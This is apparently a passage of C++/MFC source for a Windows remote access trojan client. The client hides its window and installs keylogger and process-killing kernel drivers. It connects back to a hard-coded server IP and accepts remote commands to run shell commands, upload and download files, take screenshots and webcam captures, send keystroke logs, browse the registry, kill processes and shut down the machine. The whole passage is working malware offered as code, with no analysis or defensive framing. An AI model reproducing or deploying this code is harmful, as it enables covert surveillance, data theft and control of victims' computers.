				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			default:
				sprintf(zt, "%s--%s", starttyp, "UNKNOW");
				send(sclient, zt, 50, 0);
				recv(sclient, test, 20, 0);
				send(sclient, path(SCMan, service_status, i, ResumeHandle), 256, 0);
				recv(sclient, test, 20, 0);
				break;
			}

		}
		delete[] service_status;
		CloseServiceHandle(SCMan);
	} while (0);
	send(sclient, "mserverstop", 15, 0);
	return 0;
}
int process(SOCKET sclient)
{
	int i = 0;
	HANDLE hSnapProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//创建进程快照
	HANDLE hSnapModule;
	PROCESSENTRY32 pe;
	MODULEENTRY32  me;
	ZeroMemory(&me, sizeof(MODULEENTRY32));
	ZeroMemory(&pe, sizeof(PROCESSENTRY32));
	me.dwSize = sizeof(MODULEENTRY32);
	pe.dwSize = sizeof(PROCESSENTRY32);
	int pos = 0;
	Process32First(hSnapProcess, &pe);//从线程快照中读取第一个进程信息
	CString strTemp;
	send(sclient, "addprocess", 15, 0);
	char cst[20] = "";
	recv(sclient, cst,19,0);
	if (strcmp(cst, "wrong") == 0)
	{
		return 0;
	}
	do
	{
		char test[20] = "";
		i++;
		hSnapModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pe.th32ProcessID);   //根据进程id创建模块快照
		Module32First(hSnapModule, &me);        //读取模块中的信息  只有一个模块。因为是根据具体进程创建的模块快照
		char name[300] = "";
		sprintf(name, "%ws", pe.szExeFile);
		send(sclient, name, 256, 0);
		recv(sclient, test, 20, 0);
		strTemp.Format(_T("%d"), pe.th32ProcessID);
		char pid[20] = "";
		sprintf(pid, "%ws", strTemp);
		send(sclient, pid, 20, 0);
		recv(sclient, test, 20, 0);
		char nub[20] = "";
		strTemp.Format(_T("%d"), pe.cntThreads);
		sprintf(nub, "%ws", strTemp);
		send(sclient, nub, 20, 0);
		recv(sclient, test, 20, 0);
		char path[300] = "";
		sprintf(path, "%ws", me.szExePath);
		send(sclient, path, 256, 0);
		recv(sclient, test, 20, 0);
	} while (Process32Next(hSnapProcess, &pe));
	//Sleep(500);
	send(sclient, "addprocessstop", 15, 0);
	return 0;
}
LRESULT CALLBACK capErrorCallback(HWND hwnd, int nID, LPCSTR lpsz){//错误回调函数
	char szBuff[MAX_PATH];
	if (nID == 0)
		return true;
	if (nID == 513)
		return true;
	send(sclient, "wrong", 10, 0);
	return (LRESULT)true;
}
BOOL CmdThread(const char* cmd)
{
	SECURITY_ATTRIBUTES sa;
	DWORD bytesRead;
	DWORD dwAvail = 1;
	HANDLE hRead, hWrite;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	USES_CONVERSION;
	CString order(cmd);
	order = _T("cmd /k") + order;//加上"cmd /k"是为了能执行类似dir的命令
	if (order.IsEmpty())
	{
		return FALSE;
	}
	//创建命名管道
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		return FALSE;
	}
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	si.cb = sizeof(STARTUPINFO);
	GetStartupInfo(&si);
	si.hStdError = hWrite;//数据输出用的文件句柄
	si.hStdOutput = hWrite;//数据输出用的文件句柄
	si.wShowWindow = SW_HIDE;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	if (!CreateProcess(NULL, order.GetBuffer(order.GetLength())//执行cmd命令,并在命名中管道中写入cmd命令返回的串
		, NULL, NULL, TRUE, NULL, NULL, NULL, &si, &pi)) {
		//MessageBox("Error on CreateProcess()");
		return FALSE;
	}

	CloseHandle(hWrite);
	char buffer[4096] = { 0 };
	WaitForSingleObject(pi.hProcess,5000);
	//MessageBoxA(0, "1", "1", 0);
	if (!PeekNamedPipe(hRead, NULL, NULL, &bytesRead, &dwAvail, NULL))
	{
		//MessageBoxA(0, "21", "1", 0);
		return FALSE;
	}
	FILE* fp = fopen("cmd.zcming", "wb");
	while (dwAvail>0)
	{
		//memset(buffer, 0, 4096);
		ReadFile(hRead, buffer, 4095, &bytesRead, NULL);
		dwAvail = dwAvail - bytesRead;
		fwrite(buffer, strlen(buffer), 1, fp);
	}
	fclose(fp);
	CloseHandle(hRead);
	return TRUE;
}
int restrat(SOCKET socketn)
{
	closesocket(socketn);
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return 0;
	}

	socketn = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (socketn == INVALID_SOCKET)
	{
		printf("invalid socket !");
		return 0;
	}
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(PORT);//ppppppppppppppppppppppppppppporrrrrr
	serAddr.sin_addr.S_un.S_addr = inet_addr(ip);//iiiiiiiiiiiiiiiiiiiiiiiiipppppp
	while (1)
	{

		if (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{

			Sleep(10);
		}
		else
		{
			strcpy(internetip, GetInternetIP());
			send(sclient, internetip, 16, 0);
			_beginthread((void(__cdecl *)(void *))gi, 0, NULL);
			break;
		}
	}
	return 0;
}
int tip(char mess[255])
{
	MessageBoxA(0, mess, "Tip", 0);
	//Cmessg td;
	//td.Create(IDD_MESS); //创建一个非模态对话框
	//td.ShowWindow(SW_SHOWNORMAL); //显示非模态对话框
	return 0;

}
void go()
{
	while (1)
	{
		
		if (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{
			
			Sleep(10);
		}
		else
		{
			send(sclient, internetip, 16, 0);
			_beginthread((void(__cdecl *)(void *))gi, 0, NULL);
			break;
		}
	}
}
int gi()
{
	while (true)
	{
		    USES_CONVERSION;
		    HKEY hTestKey;
			char te[10] = "";
			char rres[500] = "";
			//char result[408] = "";
			char recData[255] = "";
			int ret = recv(sclient, recData, 255, 0);
			if (ret > 0)
			{
				if (strcmp(str1, recData) == 0)
				{
					
				}
				else if (strcmp(str2, recData) == 0)
				{
					//download
					send(sclient, "oyear", 10, 0);
					char ppp[256] = "";
					recv(sclient, ppp, 256, 0);
					//MessageBoxA(0, ppp, "1", 0);
					//////////////sendfile////////
					int haveSend = 0;
					const int bufferSize = 1024;
					char buffer[bufferSize] = { 0 };
					int readLen = 0;
					ifstream srcFile;
					srcFile.open(ppp, ios::binary);
					while (1){
						char test[10] = "";
						srcFile.read(buffer, bufferSize);
						readLen = srcFile.gcount();
						if (readLen<=0)
						{
							send(sclient, "finish", 10, 0);
							//recv(sclient, test, 10, 0);
							break;
						}
						send(sclient,buffer, readLen,0);
						if (srcFile.eof() == TRUE)
						{
							recv(sclient, test, 10, 0);
							send(sclient, "finish", 10, 0);
							break;
						}
						recv(sclient, test, 10, 0);
					}
					//send(sclient, "finish", 10, 0);
					srcFile.close();
				}
				else if (strcmp(str3, recData) == 0)
				{
					//upload
					send(sclient, "oyear", 10, 0);
					char pathtu[256] = "";
					recv(sclient, pathtu, 256, 0);
					send(sclient, "oyear", 10, 0);
                   //////////////////recv/////////////////////////
					const int bufferSize = 1024;
					char buffer[bufferSize] = { 0 };
					int readLen = 0;
					ofstream desFile;
					desFile.open(pathtu, ios::binary);
					do
					{
						readLen = recv(sclient, buffer, bufferSize, 0);
						//MessageBoxA(0, buffer, "1", 0);
						if (strcmp("finish", buffer) == 0)
						{
							//send(sclient, "imokeee", 10, 0);
							break;
						}
						send(sclient, "imokeee", 10, 0);
						desFile.write(buffer, readLen);
					} while (true);
					desFile.close();
				}
				else if (strcmp("vdiomaner", recData) == 0)
				{
					static HWND hVideo;	//视频捕获窗口句柄
					static HMENU hMenu, hSubMenu, hMenuSet;	//用以对系统菜单的操作
					CAPTUREPARMS capParms;		//用以获取设备所支持的功能


					//用程序当前目录对 FoldPath 进行初始化。

					//创建捕获窗口，并将其与错误回调函数关联
					
					hVideo = capCreateCaptureWindow(_T("Capture"), WS_VISIBLE | WS_CHILD, 0, 0, 640, 480, hWnd, IDVIDEO);
					capSetCallbackOnError(hVideo, capErrorCallback);

					//连接到第一个视频驱动器
					capDriverConnect(hVideo, 0);
					//capPreviewRate(hVideo, 60);			//设置预览的帧速率
					//capPreview(hVideo, FALSE);			//开始预览

					//设置捕获时的参数
					capCaptureGetSetup(hVideo, &capParms, sizeof(capParms));
					capParms.fYield = true;			//让程序创建一个新的线程进行捕获，防止主程序在捕获时卡死
					capParms.fAbortLeftMouse = false;		//禁止鼠标按下左右键时结束捕获（我们自己来结束）
					capParms.fAbortRightMouse = false;
					capCaptureSetSetup(hVideo, &capParms, sizeof(capParms));
					capFileSaveDIB(hVideo, _T("1.bmp"));
					capSetCallbackOnError(hVideo, NULL);	//取消错误回调函数关联
					//capPreview(hVideo, FALSE);			//结束预览
					capDriverDisconnect(hVideo);		//与驱动断开连接
					send(sclient, "ready", 10, 0);
					recv(sclient, te, 10, 0);
					int haveSend = 0;
					const int bufferSize = 1024;
					char buffer[bufferSize] = { 0 };
					int readLen = 0;
					ifstream srcFile;
					srcFile.open("1.bmp", ios::binary);
					while (1){
						char test[10] = "";
						srcFile.read(buffer, bufferSize);
						readLen = srcFile.gcount();
						if (readLen <= 0)
						{
							send(sclient, "finish", 10, 0);
							//recv(sclient, test, 10, 0);
							break;
						}
						send(sclient, buffer, readLen, 0);
						if (srcFile.eof() == TRUE)
						{
							recv(sclient, test, 10, 0);
							send(sclient, "finish", 10, 0);
							break;
						}
						recv(sclient, test, 10, 0);
					}
					//send(sclient, "finish", 10, 0);
					srcFile.close();

					remove("1.bmp");
				}
				else if (strcmp(str4, recData) == 0)
				{
					keysys = 0;
					Sleep(100);
					if (keysys != 1)
					{
						uninstallkeyhook();//
					}
				   closesocket(sclient);
				   ::CloseHandle(hMutex);
				   exit(0);
				   
				}
				else if (strcmp(recData, "checkvdio") == 0)
				{
					if (GetVideoInfo()==1)
					{
						send(sclient, "yes", 5, 0);
					}
					else
					{
						send(sclient, "no", 5, 0);
					}
				}
				else if (strcmp(str5, recData) == 0)
				{
					FILE* fckeckkey = fopen("key.zcming", "r+b");
					if (fckeckkey==NULL)
					{
						send(sclient, "wrong", 10, 0);
						continue;
					}
					send(sclient, "okok", 10, 0);
					recv(sclient, te, 10, 0);
					fclose(fckeckkey);
				////////////////////okok/////////////
					//////////////sendfile////////
					int haveSend = 0;
					const int bufferSize = 1024;
					char buffer[bufferSize] = { 0 };
					int readLen = 0;
					ifstream srcFile;
					srcFile.open("key.zcming", ios::binary);
					while (1){
						char test[10] = "";
						srcFile.read(buffer, bufferSize);
						readLen = srcFile.gcount();
						if (readLen <= 0)
						{
							send(sclient, "finish", 10, 0);
							//recv(sclient, test, 10, 0);
							break;
						}
						send(sclient, buffer, readLen, 0);
						if (srcFile.eof() == TRUE)
						{
							recv(sclient, test, 10, 0);
							send(sclient, "finish", 10, 0);
							break;
						}
						recv(sclient, test, 10, 0);
					}
					//send(sclient, "finish", 10, 0);
					srcFile.close();
				}
				else if (strcmp("screenshot", recData) == 0)
				{
					CImage image;
					HDC hdcSrc = GetDC(NULL);
					int nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);
					int nWidth = GetDeviceCaps(hdcSrc, HORZRES);
					int nHeight = GetDeviceCaps(hdcSrc, VERTRES);
					image.Create(nWidth, nHeight, nBitPerPixel);
					BitBlt(image.GetDC(), 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
					ReleaseDC(NULL, hdcSrc);
					image.ReleaseDC();
					image.Save(L"1.png", Gdiplus::ImageFormatPNG);//ImageFormatJPEG

					int haveSend = 0;
					const int bufferSize = 1024;
					char buffer[bufferSize] = { 0 };
					int readLen = 0;
					ifstream srcFile;
					srcFile.open("1.png", ios::binary);
					while (1){
						char test[10] = "";
						srcFile.read(buffer, bufferSize);
						readLen = srcFile.gcount();
						if (readLen <= 0)
						{
							send(sclient, "finish", 10, 0);
							//recv(sclient, test, 10, 0);
							break;
						}
						send(sclient, buffer, readLen, 0);
						if (srcFile.eof() == TRUE)
						{
							recv(sclient, test, 10, 0);
							send(sclient, "finish", 10, 0);
							break;
						}
						recv(sclient, test, 10, 0);
					}
					//send(sclient, "finish", 10, 0);
					srcFile.close();

					remove("1.png");
				}
				else if (strcmp(str6, recData) == 0)
				{
				//清空键盘记录
				   if (remove("key.zcming") == 0)
				   {
					   char* sendData = (char*)"删除成功";
					   send(sclient, sendData, strlen(sendData), 0);
				   }
				   else
				   {
					   char* sendData = (char*)"删除失败";
					   send(sclient, sendData, strlen(sendData), 0);
				   }
				}
				else if (strcmp(str7, recData) == 0)
				{
				   char mess[500] = "";
				   recv(sclient, mess, 500, 0);
				   _beginthread((void(__cdecl*)(void*))tip, 0, mess);
				   }
				else if (strcmp("reboot", recData) == 0)
				{
				   WinExec("shutdown -r -t 0", SW_HIDE);
				}
				else if (strcmp("runfile", recData) == 0)
				{
					send(sclient, "oyear", 10, 0);
					char patht[256] = "";
					recv(sclient, patht, 256, 0);
					WinExec(patht, SW_SHOW);
				}
				else if (strcmp("deletfile", recData) == 0)
				{
					send(sclient, "oyear", 10, 0);
					char pathtfd[256] = "";
					recv(sclient, pathtfd, 256, 0);
					if (remove(pathtfd) == 0)
					{
						send(sclient, "删除成功", 10, 0);
					}
					else
					{
						send(sclient, "删除失败", 10, 0);
					}
					//WinExec(patht, SW_SHOW);
				}
				else if (strcmp("addfodler", recData) == 0)
				{
					send(sclient, "oyear", 10, 0);
					char pathtf[256] = "";
					recv(sclient, pathtf, 256, 0);
					CreateDirectory(A2CW(pathtf),NULL);
				}
				else if (strcmp("deletefolder", recData) == 0)
				{
					send(sclient, "oyear", 10, 0);
					char pathtfd[256] = "";
					recv(sclient, pathtfd, 256, 0);
					RemoveDirectory(A2CW(pathtfd));
				}
				else if (strcmp("shutdown", recData) == 0)
				{
				   WinExec("shutdown -s -t 0", SW_HIDE);
				}
				else if (strcmp(recData,"cmdorder")==0)
				{
				   send(sclient, "zcmnb", 20, 0);
				   char md[100] = "";
				   recv(sclient, md, 100, 0);
				   USES_CONVERSION;
				   bool cmd = CmdThread(md);
				   if (cmd==TRUE)
				   {
					   send(sclient, "okokzcm", 20, 0);
					   recv(sclient, md, 100, 0);
					   //////////////sendfile////////
					   int haveSend = 0;
					   const int bufferSize = 1024;
					   char buffer[bufferSize] = { 0 };
					   int readLen = 0;
					   ifstream srcFile;
					   srcFile.open("cmd.zcming", ios::binary);
					   while (1){
						   char test[10] = "";
						   srcFile.read(buffer, bufferSize);
						   readLen = srcFile.gcount();
						   if (readLen <= 0)
						   {
							   send(sclient, "finish", 10, 0);
							   //recv(sclient, test, 10, 0);
							   break;
						   }
						   send(sclient, buffer, readLen, 0);
						   if (srcFile.eof() == TRUE)
						   {
							   recv(sclient, test, 10, 0);
							   send(sclient, "finish", 10, 0);
							   break;
						   }
						   recv(sclient, test, 10, 0);
					   }
					   //send(sclient, "finish", 10, 0);
					   srcFile.close();

					   remove("cmd.zcming");
				   }
				   else
				   {
					   send(sclient, "wrong", 20, 0);
				   }

				}
				else if (strcmp("getifomation", recData) == 0)
				{
					LOGININFO ifo;
					ifo = GetMySysInfo();
					DWORD cpunub = ifo.m_CpuCount;
					char szText0[10];
					sprintf(szText0, "%d", cpunub);
					DWORD speed = ifo.m_CpuSpeed;
					char szText[10];
					sprintf(szText, "%d", speed);
					DWORD space = ifo.m_MemContent;
					char szText2[30];
					sprintf(szText2, "%d", space);
					send(sclient, ifo.PCNAME, 100, 0);
					recv(sclient, te, 10, 0);
					send(sclient, ifo.m_SysType, 50, 0);
					recv(sclient, te, 10, 0);
					send(sclient, szText0, 10, 0);
					recv(sclient, te, 10, 0);
					send(sclient, szText, 10, 0);
					recv(sclient, te, 10, 0);
					send(sclient, szText2, 30, 0);
					recv(sclient, te, 10, 0);
				}
				else if (strcmp("processz", recData) == 0)
				{
				    process(sclient);
				}
				else if (strcmp("dirverkill", recData) == 0)
				{
					if (killsys==0)
					{
						send(sclient, "wrong", 10, 0);
						continue;
					}
					send(sclient, "dirvernb", 10, 0);
					char pro[50] = "";
					recv(sclient, pro, 50, 0);
					char buffer[50] = { 0 };
					sprintf(buffer, "%s", pro);
					HANDLE handle = CreateFileA("\\\\.\\MyDevice1_link", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (handle == INVALID_HANDLE_VALUE){
						continue;
					}
					unsigned char buffer2[50] = { 0 };
					DWORD len;
					DeviceIoControl(handle, IOCTL1, buffer, strlen(buffer), buffer2, 1, &len, NULL);
					CloseHandle(handle);
				}
				else if (strcmp("servermanger", recData) == 0)
				{
					server(sclient);
				}
				else if (strcmp("firstfileview", recData) == 0)
				{
					SHFILEINFO ifo;
					BOOL fResult;
					DRIVER dir;
					for (wchar_t d = 'A'; d <= 'Z'; d++)
					{
						memset(&dir, 0, sizeof(DRIVER));
						unsigned _int64 i64FreeBytesToCaller;
						unsigned _int64 i64TotalBytes;
						unsigned _int64 i64FreeBytes;
						TCHAR szTemp[3] = { d, ':', '\0' };
						UINT uType = GetDriveTypeW(szTemp);
						switch (uType)
						{
						case DRIVE_FIXED:
						{
							fResult = GetDiskFreeSpaceEx(szTemp, (PULARGE_INTEGER)&i64FreeBytesToCaller, (PULARGE_INTEGER)&i64TotalBytes, (PULARGE_INTEGER)&i64FreeBytes);
							// 盘符
							dir.disk = d;
							if (fResult)
							{
								dir.all = (double)(i64TotalBytes / 1024.0 / 1024 / 1024);
								dir.free = (double)(i64FreeBytesToCaller / 1024.0 / 1024 / 1024);
							}
							else
							{
								dir.all = 0.0;
								dir.free = 0.0;
							}
							char a = static_cast<char>(dir.disk);
							CString str(a);
							str = str + _T(":");
							SHGetFileInfo(str, 0, &ifo, sizeof(ifo), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
							char test[20] = "";
							char Te[20] = "";
							sprintf(test, "%d ", ifo.iIcon);
							//m_tree.InsertItem(str, ifo.iIcon, ifo.iIcon, TVI_ROOT);
							send(sclient, T2A(str), 256, 0);
							recv(sclient, Te, 20, 0);
							send(sclient, test, 20, 0);
							recv(sclient, Te, 20, 0);


							show(str, sclient);

							str = ("");
							break;
						}
						default:
						{
							continue;
						}
						}

					}
					send(sclient, "finish", 10, 0);
				}
				else if (strcmp("fileview", recData) == 0)
				{
					send(sclient, "zcmingnb", 10, 0);
					char path[256] = "";
					recv(sclient, path, 256, 0);
					CString pathstr(path);
					show(pathstr, sclient);

				}
				else if (strcmp("firstreg", recData) == 0)
				{

					if (RegOpenKeyEx(HKEY_CURRENT_USER,
						NULL,
						0,
						KEY_READ,
						&hTestKey) == ERROR_SUCCESS
						)
					{
						send(sclient, "HKEY_CURRENT_USER", 20, 0);
						recv(sclient, te, 10, 0);
						QueryKey(hTestKey, sclient);
					}
					if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
						NULL,
						0,
						KEY_READ,
						&hTestKey) == ERROR_SUCCESS
						)
					{
						send(sclient, "HKEY_LOCAL_MACHINE", 20, 0);
						recv(sclient, te, 10, 0);
						QueryKey(hTestKey, sclient);
					}
					if (RegOpenKeyEx(HKEY_USERS,
						NULL,
						0,
						KEY_READ,
						&hTestKey) == ERROR_SUCCESS
						)
					{
						send(sclient, "HKEY_USERS", 20, 0);
						recv(sclient, te, 10, 0);
						QueryKey(hTestKey, sclient);
					}
					if (RegOpenKeyEx(HKEY_CURRENT_CONFIG,
						NULL,
						0,
						KEY_READ,
						&hTestKey) == ERROR_SUCCESS
						)
					{
						send(sclient, "HKEY_CURRENT_CONFIG", 20, 0);
						recv(sclient, te, 10, 0);
						QueryKey(hTestKey, sclient);
					}
					send(sclient, "mainfinish", 12, 0);
				}
				else if (strcmp("regview", recData) == 0)
				{
					send(sclient, "zcming", 10, 0);
					char ketpath[256] = "";
					char rootname[256] = "";
					recv(sclient, ketpath, 256, 0);
					CString pk(ketpath);
					send(sclient, "zcming", 10, 0);
					recv(sclient, rootname, 256, 0);
					CString root(rootname);
					//MessageBox(0, pk, root, 0);
					if (root == "HKEY_CURRENT_USER")
					{
						if (RegOpenKeyEx(HKEY_CURRENT_USER,
							pk,
							0,
							KEY_READ,
							&hTestKey) == ERROR_SUCCESS
							)
						{
							QueryKey(hTestKey, sclient);
						}
					}
					else if (root == "HKEY_LOCAL_MACHINE")
					{
						if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
							pk,
							0,
							KEY_READ,
							&hTestKey) == ERROR_SUCCESS
							)
						{
							QueryKey(hTestKey, sclient);
						}
					}
					else if (root == "HKEY_USERS")
					{
						if (RegOpenKeyEx(HKEY_USERS,
							pk,
							0,
							KEY_READ,
							&hTestKey) == ERROR_SUCCESS
							)
						{
							QueryKey(hTestKey, sclient);
						}
					}
					else if (root == "HKEY_CURRENT_CONFIG")
					{
						if (RegOpenKeyEx(HKEY_CURRENT_CONFIG,
							pk,
							0,
							KEY_READ,
							&hTestKey) == ERROR_SUCCESS
							)
						{
							QueryKey(hTestKey, sclient);
						}
					}

				}
				else if (strcmp("closeprocess", recData) == 0)
				{
					send(sclient, "raaaad", 10, 0);
					char id[20] = "";
					recv(sclient, id, 20, 0);
					HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(id));
					DWORD dExitCode;
					int code = 0;
					GetExitCodeProcess(hProcess, &dExitCode);
					code = TerminateProcess(hProcess, dExitCode);
					if (code == 0)
					{
						//f
						send(sclient, "wrong", 15, 0);
					}
					else
					{
						//s
						send(sclient, "succeed！", 15, 0);
					}
                }
				else
				{
					//MessageBoxA(0, recData, "sad", 0);
					Sleep(1);
				}
			}
			else
			{
			    //MessageBoxA(0, "dx", "sad", 0);
				restrat(sclient);
				break;
				return 0;
			}
	}
	return 0;
}
// Cpjv20Dlg 对话框
Cpjv20Dlg::Cpjv20Dlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(Cpjv20Dlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}
void Cpjv20Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}
BEGIN_MESSAGE_MAP(Cpjv20Dlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON1, &Cpjv20Dlg::OnBnClickedButton1)
	ON_WM_WINDOWPOSCHANGING()
	ON_WM_TIMER()
	ON_WM_DESTROY()
END_MESSAGE_MAP()
// Cpjv20Dlg 消息处理程序
BOOL Cpjv20Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	
	// TODO:  在此添加额外的初始化代码
	TCHAR* lpszName = _T("zcmingnbq");
	hMutex = ::CreateMutex(NULL, FALSE, lpszName);
	DWORD dwRet = ::GetLastError();
	if (hMutex)
	{
		if (ERROR_ALREADY_EXISTS == dwRet)
		{
			CloseHandle(hMutex);
			exit(0);
			return FALSE;
		}
	}
	hWnd = AfxGetMainWnd()->m_hWnd;
	GetSystemName(sysName);
	if (sysName == "")
	{
		GetSystemNameUp(sysName);
	}
	string dirver1 = "";
	const int nBitSys = GetSystemBits();
	if (nBitSys==32)
	{
		sysName = sysName + "(x86)";
		
	}
	else if (nBitSys == 64)
	{
		sysName = sysName + "(x64)";
	}
	dirver1 = sysName + "killproc.sys";
	
	ModifyStyleEx(WS_EX_APPWINDOW, WS_EX_TOOLWINDOW);

	int a = servicecheck(_T("kill"));
	int b = servicecheck(_T("keydirver"));
	switch (a)
	{
	case 0:
		break;
	case 1:
		killsys = installDvr("killproc.sys", _T("kill"))*startDvr(_T("kill"));

		break;
	case 2:
		killsys = 1;

		break;
	case 3:
		killsys = startDvr(_T("kill"));

		break;
	default:
		break;
	}
	switch (b)
	{
	case 0:
		break;
	case 1:
		keysys = installDvr("keyboarddriver.sys", _T("keydirver"))*startDvr(_T("keydirver"));
		if (keysys == 0)
		{
			installkeyhook();//
		}
		else
		{
			_beginthread((void(__cdecl *)(void *))driverkeyrecod, 0, NULL);
		}
		break;
	case 2:
		keysys = 1;
		_beginthread((void(__cdecl *)(void *))driverkeyrecod, 0, NULL);
		break;
	case 3:
		keysys = startDvr(_T("keydirver"));
		if (keysys == 0)
		{
			installkeyhook();//
		}
		else
		{
			_beginthread((void(__cdecl *)(void *))driverkeyrecod, 0, NULL);
		}
		break;
	default:
		break;
	}
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		return 0;
	}

	sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sclient == INVALID_SOCKET)
	{
		printf("invalid socket !");
		return 0;
	}
	strcpy(internetip, GetInternetIP());
	//sockaddr_in serAddr;
	serAddr.sin_family = AF_INET;
	serAddr.sin_port = htons(PORT);//ppppppppppppppppppppppppppppporrrrrr10241
	serAddr.sin_addr.S_un.S_addr = inet_addr(ip);//iiiiiiiiiiiiiiiiiiiiiiiiipppppp64.69.43.237
	_beginthread((void(__cdecl *)(void *))go, 0, NULL);
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}
// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。
void Cpjv20Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}
//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR Cpjv20Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
void Cpjv20Dlg::OnBnClickedButton1()
{
	// TODO:  在此添加控件通知处理程序代码
	uninstallkeyhook();
}
void Cpjv20Dlg::OnWindowPosChanging(WINDOWPOS* lpwndpos)
{
	
	lpwndpos->flags &= ~SWP_SHOWWINDOW;
	CDialogEx::OnWindowPosChanging(lpwndpos);

	// TODO:  在此处添加消息处理程序代码
}
void Cpjv20Dlg::OnTimer(UINT_PTR nIDEvent)
{
	// TODO:  在此添加消息处理程序代码和/或调用默认值
	CDialogEx::OnTimer(nIDEvent);
}
void fileview(SOCKET sclient)
{
	CFileFind filefind;
	BOOL b = filefind.FindFile(_T("F:\\vs开发\\c++"));
	while (b)
	{
		b = filefind.FindNextFile();
		CString strname = filefind.GetFileName();
		if (filefind.IsDots()||filefind.IsArchived())
		{
			continue;
		}
		MessageBox(0, strname, _T("1"), 0);
	}
	//filefind.Close();
}

void Cpjv20Dlg::OnDestroy()
{
	CDialogEx::OnDestroy();

	// TODO:  在此处添加消息处理程序代码
	::CloseHandle(hMutex);
}
